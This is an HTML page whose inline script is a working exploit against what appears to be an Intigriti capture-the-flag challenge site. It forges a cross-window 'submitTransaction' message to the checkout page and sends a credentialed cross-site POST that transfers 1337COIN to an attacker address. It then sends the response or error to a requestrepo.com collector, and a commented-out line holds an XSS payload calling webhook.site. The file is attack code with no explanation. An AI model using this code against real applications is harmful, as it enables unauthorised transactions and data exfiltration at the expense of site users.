<html>
<body>
    <script>        
        //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';

        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00000001", "_blank");
        const payload = {
        type: "submitTransaction",
        transaction: {
            toAddress: 'XSSWASHERE',
            currency: '1337COIN',
            amount: 1337
        }
    };

    setTimeout(() => {
        if (win) {
            console.log("Sending payload...");
            win.postMessage(payload, "*");
            fetch(`https://we6hfxdk.requestrepo.com?status=sent`);
        }
    }, 2000);
        
    async function executeAttack() {
        try {
            const response = await fetch('https://challenge-0126.intigriti.io/api/transaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({
                    "toAddress": "1afefa17653da6df5ebeb45947b91262d3",
                    "currency": "1337COIN",
                    "amount": 1
                })
            });
            
            const result = await response.json();
            
            await fetch('http://we6hfxdk.requestrepo.com/?data=' + 
                       encodeURIComponent(JSON.stringify(result)));
            
        } catch (error) {
            await fetch('http://we6hfxdk.requestrepo.com/?error=' + 
                       encodeURIComponent(error.message));
        }
    }
    
    executeAttack();      
    </script>
</body>
</html>
